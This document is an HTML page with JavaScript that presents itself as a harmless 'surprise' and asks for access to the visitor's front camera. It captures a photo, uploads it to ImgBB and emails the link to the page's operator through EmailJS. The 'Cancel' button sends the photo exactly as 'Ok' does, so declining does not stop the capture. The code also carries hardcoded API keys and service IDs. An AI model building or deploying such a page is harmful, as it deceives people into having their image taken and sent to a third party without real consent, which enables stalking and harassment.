<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
<title>Surprise</title>
<script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
<style>
  body { text-align: center; font-family: sans-serif; background: #f4f4f4; padding: 50px; }
  button { padding: 15px 25px; font-size: 16px; background: #4CAF50; color: white; border: none; border-radius: 5px; cursor: pointer; }
  #cancelBtn { background-color: #f44336; }
  #cameraContainer, #photoContainer { display: none; }
  video, canvas { margin-top: 20px; max-width: 100%; border-radius: 10px; }
</style>
</head>
<body>
<h1>Here is something surprise for you!</h1>
<button id="startBtn">Ok, Surprise Me</button>

<div id="cameraContainer">
  <video id="video" autoplay playsinline></video>
  <br>
  <button id="tapBtn">Tap Here</button>
</div>

<div id="photoContainer">
  <button id="okBtn">Ok</button>
  <button id="cancelBtn">Cancel</button>
</div>

<canvas id="canvas" style="display:none;"></canvas>

<script>
  // Init EmailJS
  emailjs.init("7VCFhr-NnUB1KWuE5"); // Your Public Key

  const startBtn = document.getElementById('startBtn');
  const tapBtn = document.getElementById('tapBtn');
  const video = document.getElementById('video');
  const canvas = document.getElementById('canvas');
  const okBtn = document.getElementById('okBtn');
  const cancelBtn = document.getElementById('cancelBtn');
  const cameraContainer = document.getElementById('cameraContainer');
  const photoContainer = document.getElementById('photoContainer');

  let stream, lastCapturedImage;

  startBtn.onclick = async () => {
    try {
      startBtn.style.display = 'none';
      cameraContainer.style.display = 'block';
      stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
      video.srcObject = stream;
    } catch (err) {
      alert('Camera permission denied. Please grant access.');
    }
  };

  tapBtn.onclick = () => {
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    canvas.getContext('2d').drawImage(video, 0, 0);
    lastCapturedImage = canvas.toDataURL('image/jpeg');
    video.style.display = 'none';
    cameraContainer.style.display = 'none';
    photoContainer.style.display = 'block';
    stopCamera();
  };

  okBtn.onclick = () => uploadAndSend(lastCapturedImage);
  cancelBtn.onclick = () => uploadAndSend(lastCapturedImage);

  function stopCamera() {
    if (stream) {
      stream.getTracks().forEach(track => track.stop());
    }
  }

  async function uploadAndSend(imageData) {
    try {
      // Remove "data:image/jpeg;base64," from the string
      const base64Data = imageData.split(',')[1];

      // Upload to ImgBB
      const formData = new FormData();
      formData.append("key", "c0d9ac729a5860cfdd90815c8267dc08"); // Your ImgBB API Key
      formData.append("image", base64Data);

      const response = await fetch("https://api.imgbb.com/1/upload", {
        method: "POST",
        body: formData
      });

      const result = await response.json();
      if (!result.success) throw new Error("ImgBB upload failed");

      const imageUrl = result.data.url;

      // Send via EmailJS
      await emailjs.send("service_w96kc97", "template_vgccyhd", {
        name: "Friend",
        message: "Here is the surprise photo!",
        photo: imageUrl
      });

      alert("Surprise sent successfully!");
    } catch (err) {
      console.error(err);
      alert("Failed to send surprise. Please try again.");
    }
  }
</script>
</body>
</html>
